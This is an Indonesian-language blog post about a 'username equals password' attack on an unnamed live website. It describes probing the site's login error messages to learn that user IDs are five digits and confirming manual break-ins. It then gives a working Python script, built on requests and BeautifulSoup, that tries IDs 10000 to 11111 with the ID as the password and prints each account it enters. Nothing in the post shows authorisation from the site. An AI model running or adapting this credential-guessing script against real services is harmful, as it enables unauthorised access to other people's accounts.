---
layout: post
title:  "User==Pass attack"
date:   2016-12-06 18:47:00 +0700
categories: same user pass attack
comments: false
---

Dictionary attack,  bruteforce attack, soceng serangan serangan yang sudah pada umum kalau hacker udah ga mampu lagi nyerang target dengan cara cara yang halus. Serangan ini seperti memaksa membuka pintu dengan 1000 kunci yang dicoba satu satu. ga efektif dan serangan ini biasanya tidak diperbolehkan untuk digunakan pada CTF ataupun Bug Bounty karena jenis lubang keamanan ini bagi para security engginer sangat tidak rasional dikarenakan serangan ini cukup membutuhkan "*insting*" yang beketergantungan dengan "*luck*"

> "I absolutely hates die" 

yap plural dari dadu dan juga kata kerja dari mati, membutuhkan keberuntungan untuk melakukan hal statis semacam brute force, dimana  penebakan pattern pattern digunakan.

artikel kali ini akan saya jelaskan bagaimana lemahnya internet dimana beberapa orang lebih senang menggunakan password yang sama dengan username. Contoh real kasus yang akan saya jelaskan kali ini dimana ada website yang menggunakan alert pada saat username ataupun password tidak cocok. 

> ![Fail attempt login](http://k1m0ch1.github.io/images/fail-attempt-1.png)

Yap, dengan cara menebak nebak memaksa dengan false attempt pada awalnya akan muncul informasi sederhana, next step adalah mencari tahu user ini mengandung huruf/ kata atau campur.

Ternyata setelah di tes jika kita menginputkan random 5 huruf akan tetap muncul error seperti di atas dan tetap bilang kalau user harus 5 digit.

ok cukup.. berarti 5 angka.

pada contoh kali ini saya tidak akan menggunakan tools bruteforce karena serangan ini cukup sederhana dikarenakan memanfaatkan password yang sama dengan username. next saya mencoba serangan dengan username *10001* sampai *10010* dengan password yang sama dengan username.. LETS START!!

> ![Kimochi ikeh](http://k1m0ch1.github.io/images/fail-attempt-2.png)

fast forward dan ternyata pada user *10005* berhasil dilakukan berikut juga dengan user *10007*

> ![haha](http://k1m0ch1.github.io/images/success-attempt-1.png)

next nya saya bikin script python sederhana buat post login dan get cookies di percantik dengan beautifulsoup4 saya looping dari user *10000* sampai dengan user *11111*

codenya seperti ini :

```python
from requests import session
from bs4 import BeautifulSoup

base = 10000
endbase = 11111
target = "http://site target/"
proc = "index.php?action=llogin"
a=0

for x in range(base, endbase):

	exp = str(x)

	payload = {
		'login' : 'login',
	    'username': exp,
	    'password': exp
	}

	with session() as c:
	    c.post('%s%s' % (target, proc), data=payload)
	    response = c.get('%s', target)
	    soup = BeautifulSoup(response.text, 'html.parser')
	    #print(response.headers)
	    #print(response.text)
	    parsingnyah = soup.select(".top-menu")
	    if len(parsingnyah) > 0 :
	    	parsingnyah = soup.select(".top-menu > table > tr > td > br")[0].encode('utf-8')[22:-140]
	    	print "[+] Success Login user %s = %s" % (exp,parsingnyah)
```
> ![haha](http://k1m0ch1.github.io/images/lul-script-1.png)